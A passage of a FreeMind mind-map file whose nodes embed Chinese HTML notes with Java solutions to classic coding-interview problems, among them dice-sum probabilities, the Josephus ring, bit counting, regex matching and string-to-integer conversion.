      </h3>
      <p>
        使用一个二维数组 dp 存储点数出现的次数，其中 dp[i][j] 表示前 i 个骰子产生点数 j 的次数。
      </p>
      <p>
        空间复杂度：O(N<sup>2</sup>)
      </p>
      <pre>public List&lt;Map.Entry&lt;Integer, Double&gt;&gt; dicesSum(int n) {
    final int face = 6;
    final int pointNum = face * n;
    long[][] dp = new long[n + 1][pointNum + 1];
    for (int i = 1; i &lt;= face; i++)
        dp[1][i] = 1;
    for (int i = 2; i &lt;= n; i++)
        for (int j = i; j &lt;= pointNum; j++)     /* 使用 i 个骰子最小点数为 i */
            for (int k = 1; k &lt;= face &amp;&amp; k &lt;= j; k++)
                dp[i][j] += dp[i - 1][j - k];
    final double totalNum = Math.pow(6, n);
    List&lt;Map.Entry&lt;Integer, Double&gt;&gt; ret = new ArrayList&lt;&gt;();
    for (int i = n; i &lt;= pointNum; i++)
        ret.add(new AbstractMap.SimpleEntry&lt;&gt;(i, dp[n][i] / totalNum));
    return ret;
}</pre>
      <h3>
        动态规划 + 旋转数组
      </h3>
      <p>
        空间复杂度：O(N)
      </p>
      <pre>public List&lt;Map.Entry&lt;Integer, Double&gt;&gt; dicesSum(int n) {
    final int face = 6;
    final int pointNum = face * n;
    long[][] dp = new long[2][pointNum + 1];
    for (int i = 1; i &lt;= face; i++)
        dp[0][i] = 1;
    int flag = 1;                                     /* 旋转标记 */
    for (int i = 2; i &lt;= n; i++, flag = 1 - flag) {
        for (int j = 0; j &lt;= pointNum; j++)
            dp[flag][j] = 0;                          /* 旋转数组清零 */
        for (int j = i; j &lt;= pointNum; j++)
            for (int k = 1; k &lt;= face &amp;&amp; k &lt;= j; k++)
                dp[flag][j] += dp[1 - flag][j - k];
    }
    final double totalNum = Math.pow(6, n);
    List&lt;Map.Entry&lt;Integer, Double&gt;&gt; ret = new ArrayList&lt;&gt;();
    for (int i = n; i &lt;= pointNum; i++)
        ret.add(new AbstractMap.SimpleEntry&lt;&gt;(i, dp[1 - flag][i] / totalNum));
    return ret;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1501829295" CREATED="1754750414220" MODIFIED="1754751224463" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/66.%20%E6%9E%84%E5%BB%BA%E4%B9%98%E7%A7%AF%E6%95%B0%E7%BB%84.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    66. 构建乘积数组
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/94a4d381a68b47b7a8bed86f2975db46?tpId=13&amp;tqId=11204&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        给定一个数组 A[0, 1,..., n-1]，请构建一个数组 B[0, 1,..., n-1]，其中 B 中的元素 B[i]=A[0]*A[1]*...*A[i-1]*A[i+1]*...*A[n-1]。要求不能使用除法。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4240a69f-4d51-4d16-b797-2dfe110f30bd.png" width="250px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <pre>public int[] multiply(int[] A) {
    int n = A.length;
    int[] B = new int[n];
    for (int i = 0, product = 1; i &lt; n; product *= A[i], i++)       /* 从左往右累乘 */
        B[i] = product;
    for (int i = n - 1, product = 1; i &gt;= 0; product *= A[i], i--)  /* 从右往左累乘 */
        B[i] *= product;
    return B;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1660222036" CREATED="1754750400572" MODIFIED="1754750414232" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      数学
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_380408463" CREATED="1754750414223" MODIFIED="1754751228744" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/39.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0%E8%B6%85%E8%BF%87%E4%B8%80%E5%8D%8A%E7%9A%84%E6%95%B0%E5%AD%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    39. 数组中出现次数超过一半的数字
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/e8a1b01a2df14cb2b228b30ee6a92163?tpId=13&amp;tqId=11181&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        多数投票问题，可以利用 Boyer-Moore Majority Vote Algorithm 来解决这个问题，使得时间复杂度为 O(N)。
      </p>
      <p>
        使用 cnt 来统计一个元素出现的次数，当遍历到的元素和统计元素相等时，令 cnt++，否则令 cnt--。如果前面查找了 i 个元素，且 cnt == 0，说明前 i 个元素没有 majority，或者有 majority，但是出现的次数少于 i / 2 ，因为如果多于 i / 2 的话 cnt 就一定不会为 0 。此时剩下的 n - i 个元素中，majority 的数目依然多于 (n - i) / 2，因此继续查找就能找出 majority。
      </p>
      <pre>public int MoreThanHalfNum_Solution(int[] nums) {
    int majority = nums[0];
    for (int i = 1, cnt = 1; i &lt; nums.length; i++) {
        cnt = nums[i] == majority ? cnt + 1 : cnt - 1;
        if (cnt == 0) {
            majority = nums[i];
            cnt = 1;
        }
    }
    int cnt = 0;
    for (int val : nums)
        if (val == majority)
            cnt++;
    return cnt &gt; nums.length / 2 ? majority : 0;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_142381605" CREATED="1754750414227" MODIFIED="1754751229901" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/62.%20%E5%9C%86%E5%9C%88%E4%B8%AD%E6%9C%80%E5%90%8E%E5%89%A9%E4%B8%8B%E7%9A%84%E6%95%B0.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    62. 圆圈中最后剩下的数
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/f78a359491e64a50bce2d89cff857eb6?tpId=13&amp;tqId=11199&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        让小朋友们围成一个大圈。然后，随机指定一个数 m，让编号为 0 的小朋友开始报数。每次喊到 m-1 的那个小朋友要出列唱首歌，然后可以在礼品箱中任意的挑选礼物，并且不再回到圈中，从他的下一个小朋友开始，继续 0...m-1 报数 .... 这样下去 .... 直到剩下最后一个小朋友，可以不用表演。
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        约瑟夫环，圆圈长度为 n 的解可以看成长度为 n-1 的解再加上报数的长度 m。因为是圆圈，所以最后需要对 n 取余。
      </p>
      <pre>public int LastRemaining_Solution(int n, int m) {
    if (n == 0)     /* 特殊输入的处理 */
        return -1;
    if (n == 1)     /* 递归返回条件 */
        return 0;
    return (LastRemaining_Solution(n - 1, m) + m) % n;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1455083151" CREATED="1754750414230" MODIFIED="1754751230814" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/43.%20%E4%BB%8E%201%20%E5%88%B0%20n%20%E6%95%B4%E6%95%B0%E4%B8%AD%201%20%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    43. 从 1 到 n 整数中 1 出现的次数
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/bd7f978302044eee894445e244c7eee6?tpId=13&amp;tqId=11184&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        解题思路
      </h2>
      <pre>public int NumberOf1Between1AndN_Solution(int n) {
    int cnt = 0;
    for (int m = 1; m &lt;= n; m *= 10) {
        int a = n / m, b = n % m;
        cnt += (a + 8) / 10 * m + (a % 10 == 1 ? b + 1 : 0);
    }
    return cnt;
}</pre>
      <blockquote>
        <p>
          <a href="https://leetcode.com/problems/number-of-digit-one/discuss/64381/4+-lines-O(log-n">Leetcode : 233. Number of Digit One</a>-C++JavaPython)
        </p>
      </blockquote>
    </div>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1591075428" CREATED="1754750400576" MODIFIED="1754750414238" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      位运算
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_148822265" CREATED="1754750414233" MODIFIED="1754751228944" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/15.%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD%201%20%E7%9A%84%E4%B8%AA%E6%95%B0.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    15. 二进制中 1 的个数
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/8ee967e43c2c4ec193b040ea7fbb10b8?tpId=13&amp;tqId=11164&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        输入一个整数，输出该数二进制表示中 1 的个数。
      </p>
      <h3>
        解题思路
      </h3>
      <p>
        n&amp;(n-1) 位运算可以将 n 的位级表示中最低的那一位 1 设置为 0。不断将 1 设置为 0，直到 n 为 0。时间复杂度：O(M)，其中 M 表示 1 的个数。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20201105004127554.png" width="500px"/>
        
      </div>
      <br/>
      

      <pre>public int NumberOf1(int n) {
    int cnt = 0;
    while (n != 0) {
        cnt++;
        n &amp;= (n - 1);
    }
    return cnt;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_861361919" CREATED="1754750414236" MODIFIED="1754751229259" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/56.%20%E6%95%B0%E7%BB%84%E4%B8%AD%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    56. 数组中只出现一次的数字
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/389fc1c3d3be4479a154f63f495abff8?tpId=13&amp;tqId=11193&amp;tab=answerKey&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        一个整型数组里除了两个数字之外，其他的数字都出现了两次，找出这两个数。
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        两个相等的元素异或的结果为 0，而 0 与任意数 x 异或的结果都为 x。
      </p>
      <p>
        对本题给的数组的所有元素执行异或操作，得到的是两个不存在重复的元素异或的结果。例如对于数组 [x,x,y,y,z,k]，x^x^y^y^z^k = 0^y^y^z^k = y^y^z^k = 0^z^k = z^k。
      </p>
      <p>
        两个不相等的元素在位级表示上一定会有所不同，因此这两个元素异或得到的结果 diff 一定不为 0。位运算 diff &amp; -diff 能得到 diff 位级表示中最右侧为 1 的位，令 diff = diff &amp; -diff。将 diff 作为区分两个元素的依据，一定有一个元素对 diff 进行异或的结果为 0，另一个结果非 0。设不相等的两个元素分别为 z 和 k，遍历数组所有元素，判断元素与 diff 的异或结果是否为 0，如果是的话将元素与 z 进行异或并赋值给 z，否则与 k 进行异或并赋值给 k。数组中相等的元素一定会同时与 z 或者与 k 进行异或操作，而不是一个与 z 进行异或，一个与 k 进行异或。而且这些相等的元素异或的结果为 0，因此最后 z 和 k 只是不相等的两个元素与 0 异或的结果，也就是不相等两个元素本身。
      </p>
      <p>
        下面的解法中，num1 和 num2 数组的第一个元素是用来保持返回值的... 实际开发中不推荐这种返回值的方式。
      </p>
      <pre>public int[] FindNumsAppearOnce (int[] nums) {
    int[] res = new int[2];
    int diff = 0;
    for (int num : nums)
        diff ^= num;
    diff &amp;= -diff;
    for (int num : nums) {
        if ((num &amp; diff) == 0)
            res[0] ^= num;
        else
            res[1] ^= num;
    }
    if (res[0] &gt; res[1]) {
        swap(res);
    }
    return res;
}
private void swap(int[] nums) {
    int t = nums[0];
    nums[0] = nums[1];
    nums[1] = t;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1366024006" CREATED="1754750400579" MODIFIED="1754750414265" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      其它
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1507731735" CREATED="1754750414239" MODIFIED="1754751233578" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/17.%20%E6%89%93%E5%8D%B0%E4%BB%8E%201%20%E5%88%B0%E6%9C%80%E5%A4%A7%E7%9A%84%20n%20%E4%BD%8D%E6%95%B0.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    17. 打印从 1 到最大的 n 位数
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目描述
      </h2>
      <p>
        输入数字 n，按顺序打印出从 1 到最大的 n 位十进制数。比如输入 3，则打印出 1、2、3 一直到最大的 3 位数即 999。
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        由于 n 可能会非常大，因此不能直接用 int 表示数字，而是用 char 数组进行存储。
      </p>
      <p>
        使用回溯法得到所有的数。
      </p>
      <pre>public void print1ToMaxOfNDigits(int n) {
    if (n &lt;= 0)
        return;
    char[] number = new char[n];
    print1ToMaxOfNDigits(number, 0);
}
private void print1ToMaxOfNDigits(char[] number, int digit) {
    if (digit == number.length) {
        printNumber(number);
        return;
    }
    for (int i = 0; i &lt; 10; i++) {
        number[digit] = (char) (i + '0');
        print1ToMaxOfNDigits(number, digit + 1);
    }
}
private void printNumber(char[] number) {
    int index = 0;
    while (index &lt; number.length &amp;&amp; number[index] == '0')
        index++;
    while (index &lt; number.length)
        System.out.print(number[index++]);
    System.out.println();
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_558591166" CREATED="1754750414242" MODIFIED="1754751229974" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/19.%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    19. 正则表达式匹配
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/28970c15befb4ff3a264189087b99ad4?tpId=13&amp;tqId=11205&amp;tab=answerKey&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        请实现一个函数用来匹配包括 '.' 和 '*' 的正则表达式。模式中的字符 '.' 表示任意一个字符，而 '*' 表示它前面的字符可以出现任意次（包含 0 次）。
      </p>
      <p>
        在本题中，匹配是指字符串的所有字符匹配整个模式。例如，字符串 &quot;aaa&quot; 与模式 &quot;a.a&quot; 和 &quot;ab*ac*a&quot; 匹配，但是与 &quot;aa.a&quot; 和 &quot;ab*a&quot; 均不匹配。
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        应该注意到，'.' 是用来当做一个任意字符，而 '*' 是用来重复前面的字符。这两个的作用不同，不能把 '.' 的作用和 '*' 进行类比，从而把它当成重复前面字符一次。
      </p>
      <pre>public boolean match(String str, String pattern) {
    int m = str.length(), n = pattern.length();
    boolean[][] dp = new boolean[m + 1][n + 1];
    dp[0][0] = true;
    for (int i = 1; i &lt;= n; i++)
        if (pattern.charAt(i - 1) == '*')
            dp[0][i] = dp[0][i - 2];
    for (int i = 1; i &lt;= m; i++)
        for (int j = 1; j &lt;= n; j++)
            if (str.charAt(i - 1) == pattern.charAt(j - 1) || pattern.charAt(j - 1) == '.')
                dp[i][j] = dp[i - 1][j - 1];
            else if (pattern.charAt(j - 1) == '*')
                if (pattern.charAt(j - 2) == str.charAt(i - 1) || pattern.charAt(j - 2) == '.') {
                    dp[i][j] |= dp[i][j - 1]; // a* counts as single a
                    dp[i][j] |= dp[i - 1][j]; // a* counts as multiple a
                    dp[i][j] |= dp[i][j - 2]; // a* counts as empty
                } else
                    dp[i][j] = dp[i][j - 2];   // a* only counts as empty
    return dp[m][n];
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1628738644" CREATED="1754750414244" MODIFIED="1754751228957" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/20.%20%E8%A1%A8%E7%A4%BA%E6%95%B0%E5%80%BC%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    20. 表示数值的字符串
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/e69148f8528c4039ad89bb2546fd4ff8?tpId=13&amp;tqId=11206&amp;tab=answerKey&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <pre>true
&quot;+100&quot;
&quot;5e2&quot;
&quot;-123&quot;
&quot;3.1416&quot;
&quot;-1E-16&quot;</pre>
      <pre>false
&quot;12e&quot;
&quot;1a3.14&quot;
&quot;1.2.3&quot;
&quot;+-5&quot;
&quot;12e+4.3&quot;</pre>
      <h2>
        解题思路
      </h2>
      <p>
        使用正则表达式进行匹配。
      </p>
      <pre>[]  ： 字符集合
()  ： 分组
?   ： 重复 0 ~ 1 次
+   ： 重复 1 ~ n 次
*   ： 重复 0 ~ n 次
.   ： 任意字符
\\. ： 转义后的 .
\\d ： 数字</pre>
      <pre>public boolean isNumeric (String str) {
    if (str == null || str.length() == 0)
        return false;
    return new String(str).matches(&quot;[+-]?\\d*(\\.\\d+)?([eE][+-]?\\d+)?&quot;);
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1286850744" CREATED="1754750414246" MODIFIED="1754751228942" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/44.%20%E6%95%B0%E5%AD%97%E5%BA%8F%E5%88%97%E4%B8%AD%E7%9A%84%E6%9F%90%E4%B8%80%E4%BD%8D%E6%95%B0%E5%AD%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    44. 数字序列中的某一位数字
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目描述
      </h2>
      <p>
        数字以 0123456789101112131415... 的格式序列化到一个字符串中，求这个字符串的第 index 位。
      </p>
      <h2>
        解题思路
      </h2>
      <pre>public int getDigitAtIndex(int index) {
    if (index &lt; 0)
        return -1;
    int place = 1;  // 1 表示个位，2 表示 十位...
    while (true) {
        int amount = getAmountOfPlace(place);
        int totalAmount = amount * place;
        if (index &lt; totalAmount)
            return getDigitAtIndex(index, place);
        index -= totalAmount;
        place++;
    }
}
/**
 * place 位数的数字组成的字符串长度
 * 10, 90, 900, ...
 */
private int getAmountOfPlace(int place) {
    if (place == 1)
        return 10;
    return (int) Math.pow(10, place - 1) * 9;
}
/**
 * place 位数的起始数字
 * 0, 10, 100, ...
 */
private int getBeginNumberOfPlace(int place) {
    if (place == 1)
        return 0;
    return (int) Math.pow(10, place - 1);
}
/**
 * 在 place 位数组成的字符串中，第 index 个数
 */
private int getDigitAtIndex(int index, int place) {
    int beginNumber = getBeginNumberOfPlace(place);
    int shiftNumber = index / place;
    String number = (beginNumber + shiftNumber) + &quot;&quot;;
    int count = index % place;
    return number.charAt(count) - '0';
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1137760335" CREATED="1754750414249" MODIFIED="1754751230179" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/46.%20%E6%8A%8A%E6%95%B0%E5%AD%97%E7%BF%BB%E8%AF%91%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    46. 把数字翻译成字符串
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://leetcode.com/problems/decode-ways/description/">Leetcode</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        给定一个数字，按照如下规则翻译成字符串：1 翻译成“a”，2 翻译成“b”... 26 翻译成“z”。一个数字有多种翻译可能，例如 12258 一共有 5 种，分别是 abbeh，lbeh，aveh，abyh，lyh。实现一个函数，用来计算一个数字有多少种不同的翻译方法。
      </p>
      <h2>
        解题思路
      </h2>
      <pre>public int numDecodings(String s) {
    if (s == null || s.length() == 0)
        return 0;
    int n = s.length();
    int[] dp = new int[n + 1];
    dp[0] = 1;
    dp[1] = s.charAt(0) == '0' ? 0 : 1;
    for (int i = 2; i &lt;= n; i++) {
        int one = Integer.valueOf(s.substring(i - 1, i));
        if (one != 0)
            dp[i] += dp[i - 1];
        if (s.charAt(i - 2) == '0')
            continue;
        int two = Integer.valueOf(s.substring(i - 2, i));
        if (two &lt;= 26)
            dp[i] += dp[i - 2];
    }
    return dp[n];
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1438300847" CREATED="1754750414253" MODIFIED="1754751229172" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/61.%20%E6%89%91%E5%85%8B%E7%89%8C%E9%A1%BA%E5%AD%90.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    61. 扑克牌顺子
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/762836f4d43d43ca9deb273b3de8e1f4?tpId=13&amp;tqId=11198&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        五张牌，其中大小鬼为癞子，牌面为 0。判断这五张牌是否能组成顺子。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/eaa506b6-0747-4bee-81f8-3cda795d8154.png" width="350px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <pre>public boolean isContinuous(int[] nums) {
    if (nums.length &lt; 5)
        return false;
    Arrays.sort(nums);
    // 统计癞子数量
    int cnt = 0;
    for (int num : nums)
        if (num == 0)
            cnt++;
    // 使用癞子去补全不连续的顺子
    for (int i = cnt; i &lt; nums.length - 1; i++) {
        if (nums[i + 1] == nums[i])
            return false;
        cnt -= nums[i + 1] - nums[i] - 1;
    }
    return cnt &gt;= 0;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1369692156" CREATED="1754750414256" MODIFIED="1754751229374" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/64.%20%E6%B1%82%201%2B2%2B3%2B...%2Bn.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    64. 求 1+2+3+...+n
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/7a0da8fc483247ff8800059e12d7caf1?tpId=13&amp;tqId=11200&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        要求不能使用乘除法、for、while、if、else、switch、case 等关键字及条件判断语句 A ? B : C。
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        使用递归解法最重要的是指定返回条件，但是本题无法直接使用 if 语句来指定返回条件。
      </p>
      <p>
        条件与 &amp;&amp; 具有短路原则，即在第一个条件语句为 false 的情况下不会去执行第二个条件语句。利用这一特性，将递归的返回条件取非然后作为 &amp;&amp; 的第一个条件语句，递归的主体转换为第二个条件语句，那么当递归的返回条件为 true 的情况下就不会执行递归的主体部分，递归返回。
      </p>
      <p>
        本题的递归返回条件为 n \&lt;= 0，取非后就是 n &gt; 0；递归的主体部分为 sum += Sum_Solution(n - 1)，转换为条件语句后就是 (sum += Sum_Solution(n - 1)) &gt; 0。
      </p>
      <pre>public int Sum_Solution(int n) {
    int sum = n;
    boolean b = (n &gt; 0) &amp;&amp; ((sum += Sum_Solution(n - 1)) &gt; 0);
    return sum;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1391496424" CREATED="1754750414259" MODIFIED="1754751229394" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/65.%20%E4%B8%8D%E7%94%A8%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E5%81%9A%E5%8A%A0%E6%B3%95.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    65. 不用加减乘除做加法
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/59ac416b4b944300b617d4f7f111b215?tpId=13&amp;tqId=11201&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        写一个函数，求两个整数之和，要求不得使用 +、-、*、/ 四则运算符号。
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        a ^ b 表示没有考虑进位的情况下两数的和，(a &amp; b) \&lt;\&lt; 1 就是进位。
      </p>
      <p>
        递归会终止的原因是 (a &amp; b) \&lt;\&lt; 1 最右边会多一个 0，那么继续递归，进位最右边的 0 会慢慢增多，最后进位会变为 0，递归终止。
      </p>
      <pre>public int Add(int a, int b) {
    return b == 0 ? a : Add(a ^ b, (a &amp; b) &lt;&lt; 1);
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1859958126" CREATED="1754750414263" MODIFIED="1754751229373" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/67.%20%E6%8A%8A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2%E6%88%90%E6%95%B4%E6%95%B0.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    67. 把字符串转换成整数
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/1277c681251b4372bdef344468e4f26e?tpId=13&amp;tqId=11202&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        将一个字符串转换成一个整数，字符串不是一个合法的数值则返回 0，要求不能使用字符串转换整数的库函数。
      </p>
      <pre>Iuput:
+2147483647
1a33
Output:
2147483647
0</pre>
      <h2>
        解题思路
      </h2>
      <pre>public int StrToInt(String str) {
    if (str == null || str.length() == 0)
        return 0;
    boolean isNegative = str.charAt(0) == '-';
    int ret = 0;
    for (int i = 0; i &lt; str.length(); i++) {
        char c = str.charAt(i);
        if (i == 0 &amp;&amp; (c == '+' || c == '-'))  /* 符号判定 */
            continue;
        if (c &lt; '0' || c &gt; '9')                /* 非法输入 */
            return 0;
        ret = ret * 10 + (c - '0');
    }
    return isNegative ? -ret : ret;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_1973080013" CREATED="1754749800765" MODIFIED="1754750422718" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E7%9B%AE%E5%BD%95.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Leetcode 题解
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_267327116" CREATED="1754750422720" MODIFIED="1754750422722"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      前言
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
